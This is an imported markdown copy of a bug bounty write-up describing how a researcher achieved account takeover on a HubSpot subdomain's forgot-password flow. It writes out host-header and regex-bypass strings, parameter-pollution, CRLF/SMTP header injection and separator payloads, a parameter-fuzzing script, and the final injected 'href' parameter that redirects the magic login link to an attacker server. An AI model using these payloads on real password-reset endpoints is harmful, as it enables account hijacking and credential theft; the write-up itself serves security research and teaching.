---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2023-02-11_hubspot-full-account-takeover-in-bug-bounty.md
original_filename: 2023-02-11_hubspot-full-account-takeover-in-bug-bounty.md
title: HubSpot Full Account Takeover in Bug Bounty
category: documents
detected_topics:
- command-injection
- sqli
- password-reset
- otp
- rate-limit
- api-security
tags:
- imported
- documents
- command-injection
- sqli
- password-reset
- otp
- rate-limit
- api-security
language: en
raw_sha256: a5def9e56380c0e7d799efc8da4166dd23dc9612b2d0a3190d9ad1c79578ec13
text_sha256: a8e7ce433427c2965f565f3227a106b094601ead44d721429c955eb2ac156c87
ingested_at: '2026-06-28T07:32:18Z'
sensitivity: unknown
redactions_applied: false
---

# HubSpot Full Account Takeover in Bug Bounty

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2023-02-11_hubspot-full-account-takeover-in-bug-bounty.md
- Source Type: markdown
- Detected Topics: command-injection, sqli, password-reset, otp, rate-limit, api-security
- Ingested At: 2026-06-28T07:32:18Z
- Redactions Applied: False
- Raw SHA256: `a5def9e56380c0e7d799efc8da4166dd23dc9612b2d0a3190d9ad1c79578ec13`
- Text SHA256: `a8e7ce433427c2965f565f3227a106b094601ead44d721429c955eb2ac156c87`


## Content

---
title: "HubSpot Full Account Takeover in Bug Bounty"
url: "https://omar0x01.medium.com/hubspot-full-account-takeover-in-bug-bounty-4e2047914ab5"
authors: ["Omar Hashem (@OmarHashem666)"]
programs: ["HubSpot"]
bugs: ["Account takeover", "Hyperlink injection", "Password reset"]
publication_date: "2023-02-11"
added_date: "2023-02-13"
source: "pentester.land/writeups.json"
original_index: 1547
scraped_via: "browseros"
---

# HubSpot Full Account Takeover in Bug Bounty

HubSpot Full Account Takeover in Bug Bounty
Omar Hashem
11 min read
·
Feb 12, 2023

--

42

--

Hi everybody, our story today will be about how I was able to get a Full account takeover on HubSpot Public Bug Bounty Program at Bugcrowd platform

Press enter or click to view image in full size
Let’s start our story

Our subdomain was https://growanz.hubspot.com

While I was testing authentication functions I came across Forgot registration number (Forgot Password)

Press enter or click to view image in full size

The function asks us to enter an email to send a magic link to log in without a registration number (password)

Press enter or click to view image in full size
SQL Injection

As there is an email parameter absolutely there is some type of database in the backend to handle these emails which makes the email parameter the best place to test for SQLI

Press enter or click to view image in full size

After testing it found nothing but it was okay

Host Header Poisoning:

It’s common for developers to use HOST HEADER Value in reset password URI

$ForgotPassURI = "https://{$_SERVER['HTTP_HOST']}/dream-auth/forgot?
registration=$token&email=$email";

So let’s try to change the host header to a domain under our control

Press enter or click to view image in full size

Did not work

Load Balancer Host Header Override:

Okay sometimes there is a load balancer or a reverse proxy server between the users and the server so if developers used the HOST Header they will get the host of load balancer so the developer moves to use the X-Forwarded-Host header because the load balancer saves the original HOST header value in X-Forwarded-Host header

Anyway, this header should not be modified by the users but some weak load balancers or reverse proxies rewrite this header from user input which makes this header suitable for our test

Press enter or click to view image in full size

The email was sent successfully but after checking the mail I found that the forgot registration URI still contains growanz.hubspot.com

Referer Header:

Some developers expect that to access the forgot password endpoint you need to come from the main subdomain which makes them use the referer header value in their reset password

$ForgotPassURI = "https://{$_SERVER['HTTP_REFERER']}/dream-auth-forgot?
registration=$token&email=$email";
Press enter or click to view image in full size

Did not work

ORIGIN Header:

So I moved to the origin header

$ForgotPassURI = "https://{$_SERVER['HTTP_ORIGIN']}/dream-auth-forgot?
registration=$token&email=$email";

trying to add my burp collaborator domain

Press enter or click to view image in full size

Did not work too

Bypass Regular Expression:

So maybe developers do some regex to validate the user input in the previous techniques, if the user input matches the regex they will send our domain, while if it does not match the regex they will send the default subdomain from their configuration file, So let’s try to bypass it

Bypass matching on host contain growanz.hubspot.com

growanz.hubspot.com.mydomain.com

Weak regex by using dot on regex without bypassing it e.g ”^growanz.hubspot.com$|^example.virtual.host$”

growanzXhubspot.com

Bypass matching on the end at growanz.hubspot.com

mydomain.com/growanz.hubspot.com

Bypass white list validation

mydomain.com%23@growanz.hubspot.com

mydomain.com%25%32%33@growanz.hubspot.com

But the previous bypasses on the previous headers none of them worked

So let’s move to test the email parameter

HTTP-Parameter-Pollution (HPP) :

Okay we have different types of applications architecture used in application development like Monolithic, EDA, SOA, or Microservices

So as Microservices became more trendy in development these days as it has a lot of advantages that did not exist in some old architectures like Monolithic, which will help to expand our surface of attacks so what if our target relies on microservices internally that using RestFull API to communicate with each other!

So let’s figure that out

Press enter or click to view image in full size

I made this graph as a simple example for our scenario

So maybe our reset password request passed to a microservice that relay on JSP that handles requests dealing with Database (e.g. reset password email) if it exists it responds to the business routing logic which will route the original request again to the PHP microservice that deals with the SMTP service to send the reset password mail

So if microservices are used in our target we need to test other attacks like HTTP Parameter Pollution

Press enter or click to view image in full size

According to that table if we entered two parameters into PHP it will use the second parameter while other technology like JSP will use the first parameter

// HTTP parameter pollution (HPP)
{"email":"victim@mail.com","email":"attacker@mail.com"}

So if our request is passed to JSP that deals with the database it will create the reset password URI to the first email but when the request is routed again to the PHP it will send the reset pass mail to the second email

Press enter or click to view image in full size

But after checking the email I found it did not work

Attack chain (SMTP injection && HTTP Parameter Pollution)

Note: I am using PHP as an example to illustrate. I don’t mean that these attacks are specific to PHP because these attacks are suitable for other technologies that rely on SMTP parsers and services.

Imagine that your email addresses processed in that way

<?php
//It's a simple example of using the mail function
if(isset($_POST['email'])) {
  $to= $_POST['email'];  
  $subject= "Forgot Registration Number";
  $message = "
  <html>
  <body>
  <h1>Example: to login into your account</h1> 
  click on this magic link
  <a>https://growanz.hubspot.com/login?registration=$RegesNum&email=$to</a>
  <html>
  <body>";
  $subject = 'Reset Password';
// Set SMTP headers
  $additional_headers = "From: noreply@growanz.hubspot.com\n" . 
  "Content-type: text/html;";
  $additional_params = "";
  mail($to, $subject, $message, $additional_headers, $additional_params); 
}
?>

All fields in the mail function are required except the $additional_headers, $additional_params are optional

So let’s start by attacking $to parameter:

Some developers use $to param to enter the user's email without validation as they expect the mail will be sent to this user only but they miss that user can add another email to send the forgot password mail using a separator according to the official documentation you can use “,” as separator but we need to chain it with HTTP parameter pollution by entering victim email as another parameter because when the application dealing with database to reset password will found valid email to execute the query on it

Get Omar Hashem’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

So when the microservice that deals with the database found the correct email to execute the database query on it while the other microservice that deals with SMTP service if it implements a wrong validation will find the victim email although

// Comma saperator with HPP chain
{"email":"Victim@gmail.com,Attacker@gmail.com","email":"Victim@gmail.com"}
{"email":"Victim@gmail.com","email":"Victim@gmail.com,Attacker@gmail.com"}
Press enter or click to view image in full size

So let’s switch the values of the parameters

Press enter or click to view image in full size

But after checking my email it didn’t work although

So in official documentation, you can use “,” as a separator but because I played with these functions before locally I found that it accepts other separators not existing in the official documentation e.g. space and “;” which give us an advantage as may the developers make validation on “,” only to prevent adding another email but they leave spaces or “;” without validation

// Semiclon saperator with HPP chain
{"email":"Victim@gmail.com;Attacker@gmail.com","email":"Victim@gmail.com"}
{"email":"Victim@gmail.com","email":"Victim@gmail.com;Attacker@gmail.com"}
// Space saperator with HPP chain
{"email":"Victim@gmail.com%20Attacker@gmail.com","email":"Victim@gmail.com"}
{"email":"Victim@gmail.com","email":"Victim@gmail.com%20Attacker@gmail.com"}

Semicolon Separator

Press enter or click to view image in full size

Space Separator

Press enter or click to view image in full size

So $to parameter in the old version was injected into the “TO:” header without any protection against SMTP header injection attacks so let’s give it a try

CRLF Injection

Note: in Unix systems we can add only \n as a Line Feed to do SMTP header injection but in windows system you need to add \r\n to do your SMTP header injection attack

Unix System (\n url-encoded)

// Carbon Copy (CC:) with HPP chain
{"email":"Victim@mail.com%0Acc:Attacker@mail.com","email":"Victim@mail.com"}
{"email":"Victim@mail.com","email":"Victim@mail.com%0Acc:Attacker@mail.com"}

// Blind Carbon Copy (BCC:) with HPP chain
{"email": "Victim@mail.com%0Abcc:Attacker@mail.com","email":"Victim@mail.com"}
{"email":"Victim@mail.com","email":"Victim@mail.com%0Abcc:Attacker@mail.com"}

Windows System (\r\n url-encoded)

// Carbon Copy (CC:) with HPP chain
{"email":"Victim@mail.com%0D%0Acc:Attacker@mail.com","email":"Victim@mail.com"}
{"email":"Victim@mail.com","email":"Victim@mail.com%0D%0Acc:Attacker@mail.com"}

// Blind Carbon Copy (BCC:) with HPP chain
{"email": "Victim@mail.com%0D%0Abcc:Attacker@mail.com","email":"Victim@mail.com"}
{"email":"Victim@mail.com","email": "Victim@mail.com%0D%0Abcc:Attacker@mail.com"}
Press enter or click to view image in full size

But it did not work

So what if the version is a little bit newer and there is a protection against CRLF injection or SMTP header injection in $to parameter

As a protection, the mail() function started to convert control characters like a line feed or carriage return in the $subject and $to parameters into spaces

But fortunately, there was a bypass for this protection

So let’s not get into more details of the bypass to organize the write-up topics and use that bypass directly at our email parameter which should be injected into $to parameter

// HPP chain with Bypass the mail() function protection against email header injection
{"email":"Victim@mail.com\r\n \ncc: Attacker@mail.com","email":"Victim@mail.com"}
{"email":"Victim@mail.com","email":"Victim@mail.com\r\n \ncc: Attacker@mail.com"}

But it didn’t work too

So it seems that the used mail function is up to date and not vulnerable to the previous attacks

So what if the email of user value injected into the header for any logic used by developers is passed into the $additional_headers parameter

Attacking $additional_headers parameter

$additional_headers parameter used to add other needed headers by the developers e.g if the mail contains HTML data so the developers will need to set the “Content-type: text/html” header to make data parsed as HTML at the user browser or for adding “From: reset-password@hubspot.com” header

So what if for any development logic, the developers added the email entered by the user into the $additional_headers parameter at this time we should attack it with SMTP header injection (CRLF injection) as according to the official documentation that to prevent CRLF injection at $additional_headers parameter it is developer responsibility

But we already tried these attacks before

Even attacks like SMTP header injection mostly can be encountered in “Contact Us forms” and not on the reset password function but sometimes developers make some silly mistakes and that is why they were worth to give it a try

OS Command Injection:

So as PHP relies on /usr/sbin/sendmail command to send mails some developers maybe prefer to use the Command line to send emails instead of built-in functions

Simple example

$json = file_get_contents('php://input');
$json = json_decode($json, true);
$to = $json['email'];
$command = "echo 'Example: to login into your account click on this magic link https://growanz.hubspot.com/login?registration=$token&email=$to | mail -s 'Forgot Password Mail' $to";
exec($command);

So after trying different payloads to execute commands but I got nothing

ARRAY OF EMAILS

Using SMTP is not limited to sending reset password emails only it is also used to send some internal emails or as the common functions that you encounter in most of the applications “subscribe to our news feed”, etc.. so one of the common ways to send emails to all users “From the documentation” is by adding them in an array e.g. “$emails” and using functions like implode(“,”, $emails) to add “,” as separator and send emails to all emails at one time which will give them a high-performance big-O(1) instead of iterator big-O(n)

But the funny part is that developers most of the time will not rewrite the code again and again from scratch but they copy the code and edit it to fit their needs

$json = file_get_contents('php://input');
$to = json_decode($json, true);
// Send email
mail(implode(",", $to['email']), $subject, $message, $headers);

So if code like this is used in sending reset password mail it will work fine with a single email but if we tried to add multiple emails containing victim and attacker emails it will allow us to get the same rest password mail of the victim

// Array of emails
{"email":["victim@mail.com","attacker@mail.com"]}
Press enter or click to view image in full size

But didn’t work too

If we take a look at the error message we will notice that it tells us that the “$to parameter” is not a valid address which at least after all these attacks my backend code prediction was on point even though we didn’t get any vulnerability yet

Parameter bruteforce:

Anyway, we should take advantage of the API error message so I think it’s time to use Arjun maybe there are some hidden parameters there

Press enter or click to view image in full size

Arjun got nothing

Actually, that is weird as we have already an email parameter that works so now I will do parameter brute force manually

I grabbed the Arjun parameters and put the value of every parameter with all special chars in its parameter name to get an error to detect which parameter is used by the API using this simple python script

params = open("Arjun/arjun/db/large.txt","r").readlines()
params = set(params)
NewParams = set()
for param in params:
  NewParams.add('"'+param.strip()+'"'+":"+'"'+param.strip()+
'\'!@#$%^&*)(?><",')
NewParamsFile = open("new-params","w")
for param in NewParams:
  NewParamsFile.write(param+"\n")

After that put the parameters in the request and let’s see what will happen

Press enter or click to view image in full size

It seems that there is href used in the backend which was not detected by Arjun and that is the golden advice (don’t rely on tools if you don’t know what the tool is doing in the background) the reason that Arjun didn’t detect it because it adds 4 digits as a value for each parameter which means email parameter value will be invalid which will make the server always respond with “Invalid value for email parameter” and as Arjun checks based on response content-length header to check if there is a parameter that change content length which means it’s dynamic but that didn’t happen because email value was invalid all the time which made Arjun not detecting the parameters

Press enter or click to view image in full size

Anyway let’s get back to our story

If you know HTML basics then absolutely you know that the href (hyper reference) value always is URL So the first thing that came to my mind

Why did they put href parameter here?

Do they use href parameter in the forgot registration mail?

So to get answers to the above questions I injected my burp collaborator in href parameter

Press enter or click to view image in full size

So let’s take a look at our email

Press enter or click to view image in full size

Nice, we have received a mail from the hubspot.com domain

Press enter or click to view image in full size

As you see that this magic link when clicking on it instead of letting the user log in, will request my burp collaborator server which will allow me to receive the victim credentials

Hope you guys enjoyed the write-up

Keep in touch

Twitter: https://twitter.com/@OmarHashem666

Linkedin: https://www.linkedin.com/in/omar-1-hashem

Youtube: https://www.youtube.com/@omarhashem7351
